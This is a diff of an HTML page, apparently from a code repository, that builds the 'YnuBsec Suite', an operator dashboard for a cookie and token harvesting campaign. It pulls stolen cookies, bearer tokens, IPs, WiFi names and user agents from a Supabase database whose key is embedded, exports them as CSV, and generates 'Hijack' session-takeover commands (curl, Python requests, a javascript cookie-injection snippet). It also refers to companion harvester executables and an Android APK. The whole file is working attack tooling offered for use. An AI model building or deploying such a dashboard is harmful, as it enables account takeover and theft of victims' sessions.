@@ -1,167 +1,696 @@
-1. In repo → "Add file" → "Create new file"
-2. Name: `index.html`
-3. **PASTE THIS FULL CODE** ↓↓↓
-
-```html
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
-    <title>YnuB Suite</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>YnuBsec Suite - Professional Cookie Harvester Dashboard</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Segoe UI, Tahoma, sans-serif
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-            padding: 20px
+            padding: 20px;
         }
 
         .container {
-            max-width: 1400px;
+            max-width: 1600px;
             margin: 0 auto;
-            background: #fff;
-            border-radius: 15px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, .1);
-            overflow: hidden
         }
 
+        /* Header Section */
         .header {
-            background: linear-gradient(135deg, #ff6b6b, #feca57);
-            color: #fff;
+            background: white;
+            border-radius: 20px;
             padding: 30px;
-            text-align: center
+            margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
         }
 
-        .header h1 {
-            font-size: 2.5em
-        }
-
-        .stats {
+        .logo {
             display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin-top: 20px
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin-bottom: 30px;
         }
 
-        .stat {
-            background: rgba(255, 255, 255, .3);
-            padding: 15px 25px;
+        .logo h1 {
+            font-size: 2.5em;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .logo i {
+            font-size: 3em;
+            color: #667eea;
+        }
+
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            transition: transform 0.3s;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .stat-number {
+            font-size: 2.5em;
+            font-weight: bold;
+        }
+
+        .stat-label {
+            font-size: 0.9em;
+            opacity: 0.9;
+            margin-top: 10px;
+        }
+
+        /* Controls */
+        .controls {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+
+        .search-box {
+            flex: 1;
+            padding: 12px 20px;
+            border: 2px solid #e0e0e0;
             border-radius: 10px;
-            min-width: 120px;
-            text-align: center
+            font-size: 16px;
+            transition: all 0.3s;
         }
 
-        .stat-value {
-            font-size: 2em;
-            font-weight: 700;
-            color: #fff
+        .search-box:focus {
+            outline: none;
+            border-color: #667eea;
         }
 
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            font-size: 14px;
+        }
+
+        .btn-primary {
+            background: #667eea;
+            color: white;
+        }
+
+        .btn-success {
+            background: #27ae60;
+            color: white;
+        }
+
+        .btn-danger {
+            background: #e74c3c;
+            color: white;
+        }
+
+        .btn-warning {
+            background: #f39c12;
+            color: white;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Table */
         .table-container {
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+
+        .table-wrapper {
+            overflow-x: auto;
             max-height: 600px;
-            overflow: auto
+            overflow-y: auto;
         }
 
         table {
             width: 100%;
-            border-collapse: collapse
+            border-collapse: collapse;
         }
 
         th {
-            background: #343a40;
-            color: #fff;
+            background: #2c3e50;
+            color: white;
             padding: 15px;
-            font-weight: 600;
+            text-align: left;
             position: sticky;
-            top: 0
+            top: 0;
+            z-index: 10;
+            font-size: 14px;
         }
 
         td {
-            padding: 12px;
-            border-bottom: 1px solid #eee
+            padding: 12px 15px;
+            border-bottom: 1px solid #ecf0f1;
+            font-size: 13px;
         }
 
-        .token {
-            background: #ffebef;
+        tr:hover {
+            background: #f8f9fa;
+        }
+
+        .cookie-cell,
+        .token-cell {
+            max-width: 300px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
             padding: 8px;
             border-radius: 5px;
-            font-family: monospace;
-            font-size: 12px;
-            cursor: pointer
+            cursor: pointer;
+            transition: all 0.3s;
         }
 
-        .steal-btn {
-            background: #28a745;
-            color: #fff;
-            padding: 8px 16px;
+        .cookie-cell {
+            background: #fff3e0;
+        }
+
+        .token-cell {
+            background: #e8f0fe;
+        }
+
+        .cookie-cell:hover,
+        .token-cell:hover {
+            transform: scale(1.02);
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 4px 8px;
             border-radius: 5px;
-            font-size: 12px;
-            cursor: pointer
+            font-size: 10px;
+            font-weight: bold;
         }
 
-        .hit {
-            animation: pulse 1s infinite
+        .badge-new {
+            background: #27ae60;
+            color: white;
+            animation: pulse 1s infinite;
+        }
+
+        .badge-ip {
+            background: #3498db;
+            color: white;
         }
 
         @keyframes pulse {
 
             0%,
             100% {
-                box-shadow: 0 0 0 0 rgba(40, 167, 69, .7)
+                opacity: 1;
             }
 
             50% {
-                box-shadow: 0 0 0 10px rgba(40, 167, 69, 0)
+                opacity: 0.5;
+            }
+        }
+
+        .steal-btn {
+            background: #e74c3c;
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+
+        .steal-btn:hover {
+            background: #c0392b;
+            transform: scale(1.05);
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 60px;
+            color: #95a5a6;
+        }
+
+        .empty-state i {
+            font-size: 4em;
+            margin-bottom: 20px;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            max-width: 700px;
+            width: 90%;
+            max-height: 80%;
+            overflow: auto;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .close {
+            cursor: pointer;
+            font-size: 24px;
+            color: #999;
+        }
+
+        pre {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 15px;
+            border-radius: 10px;
+            overflow-x: auto;
+            font-size: 12px;
+            font-family: monospace;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #27ae60;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 10px;
+            z-index: 2000;
+            animation: slideIn 0.3s;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: white;
+            font-size: 12px;
+        }
+
+        @media (max-width: 768px) {
+            .logo h1 {
+                font-size: 1.5em;
+            }
+
+            .stat-number {
+                font-size: 1.5em;
+            }
+
+            td,
+            th {
+                font-size: 11px;
+                padding: 8px;
+            }
+
+            .cookie-cell,
+            .token-cell {
+                max-width: 150px;
             }
         }
     </style>
 </head>
 
 <body>
-    <div class=container>
-        <div class=header>
-            <h1><i class="fas fa-cookie-bite"></i> YnuB Suite</h1>
-            <p>Live Cookie Harvest</p>
-            <div class=stats>
-                <div class=stat>
-                    <div class=stat-value id=live-count>0</div>
-                    <div class=stat-label>Live Hits</div>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <div>
+                    <h1><i class="fas fa-cookie-bite"></i> YnuBsec Suite</h1>
+                    <p>Professional Cookie & Token Harvesting Platform</p>
                 </div>
-                <div class=stat>
-                    <div class=stat-value id=unique-ips>0</div>
-                    <div class=stat-label>IPs</div>
+                <i class="fas fa-shield-alt"></i>
+            </div>
+
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-number" id="totalCount">0</div>
+                    <div class="stat-label">Total Captures</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="uniqueIPs">0</div>
+                    <div class="stat-label">Unique Devices</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="tokenCount">0</div>
+                    <div class="stat-label">Tokens Found</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="liveRate">0</div>
+                    <div class="stat-label">Hits/Minute</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="activeTime">0s</div>
+                    <div class="stat-label">Session Active</div>
+                </div>
+            </div>
+
+            <div class="controls">
+                <input type="text" class="search-box" id="searchInput"
+                    placeholder="🔍 Search by IP, Cookie, Token, or User Agent...">
+                <button class="btn btn-primary" onclick="clearSearch()">
+                    <i class="fas fa-times"></i> Clear
+                </button>
+                <button class="btn btn-success" onclick="exportData()">
+                    <i class="fas fa-download"></i> Export CSV
+                </button>
+                <button class="btn btn-warning" onclick="copyAllCookies()">
+                    <i class="fas fa-copy"></i> Copy All Cookies
+                </button>
+                <button class="btn btn-danger" onclick="clearAll()">
+                    <i class="fas fa-trash"></i> Clear All
+                </button>
+                <button class="btn btn-primary" onclick="refreshData()">
+                    <i class="fas fa-sync-alt"></i> Refresh
+                </button>
+            </div>
+        </div>
+
+        <div class="table-container">
+            <div class="table-wrapper">
+                <table id="dataTable">
+                    <thead>
+                        <tr>
+                            <th><i class="fas fa-clock"></i> Time</th>
+                            <th><i class="fas fa-network-wired"></i> IP Address</th>
+                            <th><i class="fas fa-wifi"></i> WiFi SSID</th>
+                            <th><i class="fas fa-user"></i> User Agent</th>
+                            <th><i class="fas fa-cookie"></i> Cookies</th>
+                            <th><i class="fas fa-key"></i> Tokens</th>
+                            <th><i class="fas fa-bolt"></i> Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tableBody"></tbody>
+                </table>
+                <div class="empty-state" id="emptyState" style="display: none;">
+                    <i class="fas fa-cookie-bite"></i>
+                    <h3>No Cookies Yet</h3>
+                    <p>Run the harvester on any device to start capturing!</p>
+                    <p style="margin-top: 10px;">
+                        <i class="fas fa-windows"></i> Windows: WiFiHarvest.exe &nbsp;&nbsp;
+                        <i class="fas fa-android"></i> Android: Install APK
+                    </p>
                 </div>
             </div>
         </div>
-        <div class=table-container>
-            <table id=harvest-table>
-                <thead>
-                    <tr>
-                        <th>Time</th>
-                        <th>IP</th>
-                        <th>Cookies</th>
-                        <th>Tokens</th>
-                        <th>Steal</th>
-                    </tr>
-                </thead>
-                <tbody id=table-body></tbody>
-            </table>
-            <div id=empty-state style="text-align:center;padding:60px;color:#666;display:block"><i
-                    class="fas fa-cookie-bite" style="font-size:4em;color:#ccc;margin-bottom:20px"></i>
-                <h3>No cookies yet...</h3>
-                <p>Run harvester → Watch live!</p>
-            </div>
+
+        <div class="footer">
+            <p>YnuBsec Suite v2.0 | Real-time Cookie Harvesting Platform | <i class="fas fa-lock"></i> Encrypted
+                Transmission</p>
         </div>
     </div>
-    <script>const supabase = Supabase.createClient('https://bljzczucifemikxrvkkm.supabase.co', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJsanpjenVjaWZlbWlreHJ2a2ttIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5MjIxODAsImV4cCI6MjA4OTQ5ODE4MH0.R_sPF74xdjLz-n13WUlqZbqDbKY03Yveegea_MzZHT4'); let data = []; async function load() { const { data: d } = await supabase.from('cookies').select('*').order('timestamp', { ascending: false }).limit(50); data = d || []; document.getElementById('live-count').textContent = data.length; document.getElementById('unique-ips').textContent = new Set(data.map(r => r.src_ip)).size; const tbody = document.getElementById('table-body'); if (!data.length) { document.getElementById('empty-state').style.display = 'block'; return } document.getElementById('empty-state').style.display = 'none'; tbody.innerHTML = data.map((r, i) = `<tr class=${i < 3 ? 'hit' : ''}><td>${new Date(r.timestamp * 1000).toLocaleString()}</td><td>${r.src_ip}</td><td><span class=token onclick="navigator.clipboard.writeText('${r.cookies}');this.textContent='COPIED!'">${r.cookies ? r.cookies.substring(0, 50) + '...' : '-'}</span></td><td><span class=token onclick="navigator.clipboard.writeText('${r.tokens}');this.textContent='COPIED!'">${r.tokens ? r.tokens.substring(0, 50) + '...' : '-'}</span></td><td><button class=steal-btn onclick="navigator.clipboard.writeText('curl -b \"${r.cookies}\" ${r.tokens ? '-H \"Authorization: Bearer ${r.tokens}\"' : ''} https://target.com');alert('🍪 HIJACK CMD COPIED!')">HIJACK</button></td></tr>`).join(''); } setInterval(load, 2000); load();</script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
+
+    <div class="modal" id="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fas fa-terminal"></i> Hijack Command</h3>
+                <span class="close" onclick="closeModal()">&times;</span>
+            </div>
+            <pre id="commandText"></pre>
+            <button class="btn btn-success" onclick="copyCommand()" style="margin-top: 15px; width: 100%;">
+                <i class="fas fa-copy"></i> Copy to Clipboard
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // Supabase Configuration
+        const SUPABASE_URL = 'https://bljzczucifemikxrvkkm.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJsanpjenVjaWZlbWlreHJ2a2ttIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5MjIxODAsImV4cCI6MjA4OTQ5ODE4MH0.R_sPF74xdjLz-n13WUlqZbqDbKY03Yveegea_MzZHT4';
+        const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        let allData = [];
+        let previousCount = 0;
+        let sessionStart = Date.now();
+
+        // Update active time
+        setInterval(() => {
+            const elapsed = Math.floor((Date.now() - sessionStart) / 1000);
+            document.getElementById('activeTime').textContent = `${elapsed}s`;
+        }, 1000);
+
+        async function loadData() {
+            try {
+                const { data, error } = await supabase
+                    .from('cookies')
+                    .select('*')
+                    .order('timestamp', { ascending: false })
+                    .limit(200);
+
+                if (error) throw error;
+
+                if (data) {
+                    allData = data;
+                    updateStats(data);
+                    renderTable(data);
+                    calculateLiveRate(data);
+                }
+            } catch (error) {
+                console.error('Error loading data:', error);
+                showToast('Error loading data: ' + error.message);
+            }
+        }
+
+        function calculateLiveRate(data) {
+            const now = Date.now() / 1000;
+            const oneMinuteAgo = now - 60;
+            const recentHits = data.filter(item => parseFloat(item.timestamp) >= oneMinuteAgo);
+            document.getElementById('liveRate').textContent = recentHits.length;
+        }
+
+        function updateStats(data) {
+            document.getElementById('totalCount').textContent = data.length;
+            const uniqueIPs = new Set(data.map(item => item.src_ip).filter(ip => ip && ip !== 'Unknown')).size;
+            document.getElementById('uniqueIPs').textContent = uniqueIPs;
+            const tokensFound = data.filter(item => item.tokens && item.tokens.length > 5).length;
+            document.getElementById('tokenCount').textContent = tokensFound;
+        }
+
+        function renderTable(data) {
+            const tbody = document.getElementById('tableBody');
+            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
+
+            const filtered = data.filter(item =>
+                (item.src_ip && item.src_ip.toLowerCase().includes(searchTerm)) ||
+                (item.cookies && item.cookies.toLowerCase().includes(searchTerm)) ||
+                (item.tokens && item.tokens.toLowerCase().includes(searchTerm)) ||
+                (item.user_agent && item.user_agent.toLowerCase().includes(searchTerm)) ||
+                (item.wifi_ssid && item.wifi_ssid.toLowerCase().includes(searchTerm))
+            );
+
+            if (filtered.length === 0) {
+                document.getElementById('emptyState').style.display = 'block';
+                tbody.innerHTML = '';
+                return;
+            }
+
+            document.getElementById('emptyState').style.display = 'none';
+
+            tbody.innerHTML = filtered.map((item, index) => {
+                const isNew = index < 5;
+                const time = item.timestamp ? new Date(parseFloat(item.timestamp) * 1000).toLocaleString() : new Date(item.created_at).toLocaleString();
+                const cookies = item.cookies ? (item.cookies.length > 80 ? item.cookies.substring(0, 80) + '...' : item.cookies) : '-';
+                const tokens = item.tokens ? (item.tokens.length > 70 ? item.tokens.substring(0, 70) + '...' : item.tokens) : '-';
+                const userAgent = item.user_agent ? (item.user_agent.length > 40 ? item.user_agent.substring(0, 40) + '...' : item.user_agent) : '-';
+                const wifiSSID = item.wifi_ssid || '-';
+
+                return `
+                    <tr style="${isNew ? 'animation: pulse 0.5s' : ''}">
+                        <td><strong>${time}</strong> ${isNew ? '<span class="badge badge-new">NEW</span>' : ''}</td>
+                        <td><span class="badge badge-ip">${item.src_ip || 'Unknown'}</span></td>
+                        <td><i class="fas fa-wifi"></i> ${escapeHtml(wifiSSID)}</td>
+                        <td><small>${escapeHtml(userAgent)}</small></td>
+                        <td><div class="cookie-cell" onclick="copyToClipboard('${escapeHtml(item.cookies || '')}')" title="Click to copy">${escapeHtml(cookies)}</div></td>
+                        <td><div class="token-cell" onclick="copyToClipboard('${escapeHtml(item.tokens || '')}')" title="Click to copy">${escapeHtml(tokens)}</div></td>
+                        <td><button class="steal-btn" onclick="showHijackCommand('${escapeHtml(item.cookies || '')}', '${escapeHtml(item.tokens || '')}', '${item.src_ip}')"><i class="fas fa-skull"></i> Hijack</button></td>
+                    </tr>
+                `;
+            }).join('');
+        }
+
+        function escapeHtml(str) {
+            if (!str) return '';
+            return str.replace(/[&<>]/g, function (m) {
+                if (m === '&') return '&amp;';
+                if (m === '<') return '&lt;';
+                if (m === '>') return '&gt;';
+                return m;
+            });
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text);
+            showToast('Copied to clipboard!');
+        }
+
+        function showToast(message) {
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.innerHTML = `<i class="fas fa-check-circle"></i> ${message}`;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 2000);
+        }
+
+        function showHijackCommand(cookies, token, ip) {
+            let command = `# ========================================\n`;
+            command += `# HIJACK SESSION FOR: ${ip}\n`;
+            command += `# ========================================\n\n`;
+            command += `# Method 1: cURL\n`;
+            command += `curl -X GET https://target.com/profile \\\n`;
+            if (cookies) command += `  -H "Cookie: ${cookies}" \\\n`;
+            if (token) command += `  -H "Authorization: Bearer ${token}" \\\n`;
+            command += `  -v\n\n`;
+            command += `# Method 2: Python Requests\n`;
+            command += `import requests\n`;
+            command += `cookies = {'${cookies.split('=')[0] || 'session'}': '${cookies.split('=')[1] || ''}'}\n`;
+            if (token) command += `headers = {'Authorization': 'Bearer ${token}'}\n`;
+            command += `response = requests.get('https://target.com/profile', cookies=cookies, headers=headers if '${token}' else {})\n`;
+            command += `print(response.text)\n\n`;
+            command += `# Method 3: Browser Injection\n`;
+            command += `javascript:document.cookie='${cookies}'; localStorage.setItem('token','${token}'); location.reload();`;
+
+            document.getElementById('commandText').textContent = command;
+            document.getElementById('modal').style.display = 'flex';
+        }
+
+        function copyCommand() {
+            const text = document.getElementById('commandText').textContent;
+            navigator.clipboard.writeText(text);
+            showToast('Hijack command copied!');
+            closeModal();
+        }
+
+        function closeModal() {
+            document.getElementById('modal').style.display = 'none';
+        }
+
+        function clearSearch() {
+            document.getElementById('searchInput').value = '';
+            renderTable(allData);
+        }
+
+        async function exportData() {
+            const { data } = await supabase.from('cookies').select('*');
+            const headers = ['Time', 'IP', 'WiFi', 'User Agent', 'Cookies', 'Tokens'];
+            const rows = data.map(item => [
+                new Date(parseFloat(item.timestamp) * 1000).toLocaleString(),
+                item.src_ip,
+                item.wifi_ssid,
+                item.user_agent,
+                item.cookies,
+                item.tokens
+            ]);
+            const csv = [headers, ...rows].map(row => row.map(cell => `"${(cell || '').replace(/"/g, '""')}"`).join(',')).join('\n');
+            const blob = new Blob([csv], { type: 'text/csv' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `ynubsec_harvest_${Date.now()}.csv`;
+            a.click();
+            URL.revokeObjectURL(url);
+            showToast('Exported successfully!');
+        }
+
+        async function copyAllCookies() {
+            const cookies = allData.map(item => item.cookies).filter(c => c).join('\n');
+            if (cookies) {
+                navigator.clipboard.writeText(cookies);
+                showToast(`Copied ${allData.filter(d => d.cookies).length} cookies!`);
+            } else {
+                showToast('No cookies found');
+            }
+        }
+
+        async function clearAll() {
+            if (confirm('⚠️ WARNING: Delete ALL harvested data? This cannot be undone!')) {
+                await supabase.from('cookies').delete().neq('id', 0);
+                loadData();
+                showToast('All data cleared!');
+            }
+        }
+
+        function refreshData() {
+            loadData();
+            showToast('Refreshing data...');
+        }
+
+        // Auto-refresh every 2 seconds
+        setInterval(loadData, 2000);
+        loadData();
+
+        // Click outside modal to close
+        window.onclick = function (event) {
+            const modal = document.getElementById('modal');
+            if (event.target === modal) {
+                closeModal();
+            }
+        };
+
+        // Search on input
+        document.getElementById('searchInput').addEventListener('input', () => renderTable(allData));
+    </script>
 </body>
 
 </html>
